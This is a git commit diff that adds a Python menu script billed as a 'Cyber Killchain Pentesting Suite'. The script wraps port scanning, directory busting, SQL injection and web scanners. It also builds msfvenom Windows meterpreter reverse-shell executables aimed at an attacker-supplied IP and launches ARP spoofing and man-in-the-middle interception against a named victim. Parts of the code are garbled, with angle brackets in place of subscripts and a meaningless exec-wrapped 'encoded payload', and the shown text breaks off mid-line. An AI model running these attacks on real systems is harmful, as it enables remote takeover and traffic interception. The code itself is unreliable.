81f9fa4ee08dc335e53774d63e3ad621752d45b7
ShaharPT <57047724+shahar69@users.noreply.github.com>
2023-04-16 12:51:13 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,134 @@
+# Import necessary modules
+import os
+import sys
+import nmap
+import base64
+import zlib
+import subprocess
 
+
+# Define function to scan for open ports on a given IP address
+def scan(ip):
+    # Create a new nmap PortScanner object
+    nm = nmap.PortScanner()
+    print("Scanning...")
+    # Scan the IP address for ports 1-10000 with service version detection and OS detection
+    nm.scan(ip, '1-10000', arguments='-sV -O')
+    print(nm.all_hosts())
+    # For each host that was found
+    for host in nm.all_hosts():
+        print('Host : %s (%s)' % (host, nm<host>.hostname()))
+        print('State : %s' % nm<host>.state())
+        # For each protocol that was found
+        for proto in nm<host>.all_protocols():
+            print('Protocol : %s' % proto)
+            # Get all the open port numbers for this protocol
+            lport = nm<host><proto>.keys()
+            # Sort the list of port numbers
+            for port in sorted(lport):
+                # Get the name of the service and its version number
+                service = nm<host><proto><port><'name'>
+                version = nm<host><proto><port><'version'>
+                # Print the port number, state, service name, and version number
+                print('port : %s\tstate : %s\tService : %s\tVersion : %s' % (
+                    port, nm<host><proto><port><'state'>, service, version))
+        # Get the name of the operating system that was detected
+        print('OS : %s' % nm<host><'osmatch'><0><'name'>)
+
+
+# Define function to perform directory busting on a given URL
+def dirbust():
+    url = input("Enter the URL to scan: ")
+    print("Directory busting...")
+    # Call the dirb command with the given URL as an argument
+    subprocess.call(<'dirb', url>)
+
+
+# Define function to test for SQL injection vulnerabilities on a given URL
+def sqlmap():
+    url = input("Enter the URL to scan: ")
+    print("SQL injection testing...")
+    # Call the sqlmap command with the given URL as an argument
+    subprocess.call(<'sqlmap', '-u', url>)
+
+
+# Define function to scan a web server for vulnerabilities using Nikto
+def nikto():
+    url = input("Enter the URL to scan: ")
+    print("Web server scanning...")
+    # Call the nikto command with the given URL as an argument
+    subprocess.call(<'nikto', '-h', url>)
+
+
+# Define function to scan a web server for vulnerabilities using Nuclei
+def nuclei():
+    url = input("Enter the URL to scan: ")
+    print("Web server scanning...")
+    # Call the nuclei command with the given URL as an argument
+    subprocess.call(<'nuclei', '-u', url>)
+
+
+# Define function to generate a Metasploit payload
+def msfvenom():
+    print("Creating payload...")
+    # Get the attacker's IP address and the desired listening port
+    ip = input("Enter your IP address: ")
+    port = input("Enter a port: ")
+    # Get the desired name for the payload
+    payload_name = input("Enter the name of the payload: ")
+    # Set the payload type
+    payload = 'windows/meterpreter/reverse_tcp'
+    # Set the file format for the payload
+    fformat = 'exe'
+    # Encode the payload with base64 and compress it with zlib
+    encoded_payload = base64.b64encode(payload.encode('utf-8'))
+    compressed_payload = zlib.compress(encoded_payload)
+    encoded_compressed_payload = base64.b64encode(compressed_payload)
+    # Generate the payload code
+    payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
+    # Use msfvenom to generate the payload file with the specified options
+    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {fformat} -o {payload_name}.{fformat}")
+    # Write the payload code to a Python script file with the specified name
+    with open(f'{payload_name}.py', 'w') as f:
+        f.write(payload_code)
+    print(f"Payload created: {payload_name}.{fformat}")
+
+
+# Define function to perform an ARP spoofing attack
+def arp():
+    print("ARP spoofing...")
+    # Get the victim's IP address and the gateway's IP address
+    victim_ip = input("Enter victim IP: ")
+    gateway_ip = input("Enter gateway IP: ")
+    # Call the arpspoof command with the specified arguments
+    subprocess.call(<'arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip>)
+
+
+# Define function to perform a man-in-the-middle attack
+def mitm():
+    print("Starting Man-in-the-Middle Attack...")
+    # Get the victim's IP address and MAC address
+    victim_ip = input("Enter victim IP address: ")
+    victim_mac = input("Enter victim MAC address: ")
+    # Get the gateway's IP address and MAC address
+    gateway_ip = input("Enter gateway IP address: ")
+    gateway_mac = input("Enter gateway MAC address: ")
+    # Start the mitm attack using ARP spoofing
+    os.system(f"arpspoof -i eth0 -t {victim_ip} {gateway_ip} & arpspoof -i eth0 -t {gateway_ip} {victim_ip} & mitmproxy")
+
+
+# Define function to display the main menu
+def menu():
+    while True:
+        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
+        print("1. Port Scanning")
+        print("2. Directory Busting")
+        print("3. SQLInjection Testing")
+        print("4. Web Server Scanning with Nikto")
+        print("5. Generate Metasploit Payload")
+        print("6. ARP Spoofing")
+        print("7. Man-in-the-Middle Attack")
+        print("8. Exit\n")
+        # Get the user's choice
+        choice = input("Enter your choice: ")
+        # Call the
